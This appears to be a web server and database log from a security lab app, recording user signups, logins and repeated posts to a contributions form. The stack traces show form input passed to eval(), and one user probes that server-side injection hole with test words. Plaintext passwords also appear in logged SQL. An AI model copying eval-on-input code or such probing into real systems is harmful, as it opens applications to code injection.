+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 0
+DATABASE: INSERT INTO User ( userName, firstName, lastName, password, email) VALUES ( 'jennifer','jennifer','jennifer','jennifer','jennifer@jennifer.jennifer')
+DATABASE RETURN 0
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+DATABASE: INSERT INTO Allocations (userId,stocks,funds,bonds) VALUES ( 4,10,28,62)
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:45 +0000] "POST /signup HTTP/1.1" 200 9284 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE RETURN 0
+DATABASE: INSERT INTO Profile (userid) VALUES ( 4)
+DATABASE RETURN 0
+DATABASE: INSERT INTO Contributions (userid) VALUES ( 4)
+DATABASE RETURN 0
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:49 +0000] "GET /logout HTTP/1.1" 302 46 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:49 +0000] "GET / HTTP/1.1" 302 56 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:53 +0000] "POST /login HTTP/1.1" 200 7574 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:21:00 +0000] "POST /login HTTP/1.1" 200 7574 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:21:10 +0000] "POST /login HTTP/1.1" 302 64 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User WHERE userId = 4
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:21:10 +0000] "GET /dashboard HTTP/1.1" 200 9284 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [17/Apr/2019:01:23:54 +0000] "GET /signup HTTP/1.1" 200 4856 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'delmy'
+DATABASE RETURN 0
+DATABASE: INSERT INTO User ( userName, firstName, lastName, password, email) VALUES ( 'delmy','delmy','delmy','delmy','')
+DATABASE RETURN 0
+DATABASE: SELECT * FROM User U WHERE U.userName = 'delmy'
+DATABASE RETURN 1
+DATABASE: INSERT INTO Allocations (userId,stocks,funds,bonds) VALUES ( 5,38,22,40)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:24:05 +0000] "POST /signup HTTP/1.1" 200 9278 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE RETURN 0
+DATABASE: INSERT INTO Profile (userid) VALUES ( 5)
+DATABASE RETURN 0
+DATABASE: INSERT INTO Contributions (userid) VALUES ( 5)
+DATABASE RETURN 0
+::ffff:192.91.235.243 - - [17/Apr/2019:01:24:38 +0000] "GET /logout HTTP/1.1" 302 46 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:192.91.235.243 - - [17/Apr/2019:01:24:38 +0000] "GET / HTTP/1.1" 302 56 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [17/Apr/2019:01:24:38 +0000] "GET /login HTTP/1.1" 304 - "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'delmy'
+DATABASE RETURN 1
+::ffff:192.91.235.243 - - [17/Apr/2019:01:25:53 +0000] "POST /login HTTP/1.1" 302 64 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User WHERE userId = 5
+DATABASE RETURN 1
+::ffff:192.91.235.243 - - [17/Apr/2019:01:25:53 +0000] "GET /dashboard HTTP/1.1" 200 9278 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM Contributions WHERE userId = 5
+DATABASE RETURN 1
+::ffff:192.91.235.243 - - [17/Apr/2019:01:25:55 +0000] "GET /contributions HTTP/1.1" 200 9262 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+Unexpected end of input
+SyntaxError: Unexpected end of input
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:31)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:06 +0000] "POST /contributions HTTP/1.1" 500 154 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+exit is not defined
+ReferenceError: exit is not defined
+    at eval (eval at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17), <anonymous>:1:1)
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:12 +0000] "POST /contributions HTTP/1.1" 500 153 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+hello is not defined
+ReferenceError: hello is not defined
+    at eval (eval at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17), <anonymous>:1:1)
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:17 +0000] "POST /contributions HTTP/1.1" 500 154 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+hello is not defined
+ReferenceError: hello is not defined
+    at eval (eval at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17), <anonymous>:1:1)
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:24 +0000] "POST /contributions HTTP/1.1" 500 154 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:26:28 +0000] "POST /login HTTP/1.1" 200 7574 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: UPDATE Contributions SET preTax = 1, afterTax = 0, roth = 0 WHERE userId = 5
+DATABASE RETURN 0
+DATABASE: SELECT * FROM Contributions WHERE userId = 5
+DATABASE RETURN 1
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:29 +0000] "POST /contributions HTTP/1.1" 200 9631 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:26:32 +0000] "POST /login HTTP/1.1" 302 64 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User WHERE userId = 4
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:26:32 +0000] "GET /dashboard HTTP/1.1" 304 - "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: UPDATE Contributions SET preTax = 5, afterTax = 0, roth = 0 WHERE userId = 5
+DATABASE RETURN 0
+DATABASE: SELECT * FROM Contributions WHERE userId = 5
+DATABASE RETURN 1
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:37 +0000] "POST /contributions HTTP/1.1" 200 9631 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+int is not defined
+ReferenceError: int is not defined
+    at eval (eval at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17), <anonymous>:1:1)
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:41 +0000] "POST /contributions HTTP/1.1" 500 152 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+bet is not defined
+ReferenceError: bet is not defined
+    at eval (eval at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17), <anonymous>:1:1)
+    at handleContributionsUpdate (/home/ec2-user/security_lab/contributions.js:65:17)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/ec2-user/security_lab/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at isLoggedInMiddleware (/home/ec2-user/security_lab/session.js:61:28)
+    at Layer.handle [as handle_request] (/home/ec2-user/security_lab/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:317:13)
+    at /home/ec2-user/security_lab/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/ec2-user/security_lab/node_modules/express/lib/router/index.js:275:10)
+    at logger (/home/ec2-user/security_lab/node_modules/morgan/index.js:144:5)
+::ffff:192.91.235.243 - - [17/Apr/2019:01:26:48 +0000] "POST /contributions HTTP/1.1" 500 152 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/contributions" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM Contributions WHERE userId = 4
+DATABASE RETURN 1
+::ffff:138.16.125.251 - - [17/Apr/2019:01:36:11 +0000] "GET /contributions HTTP/1.1" 200 9262 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
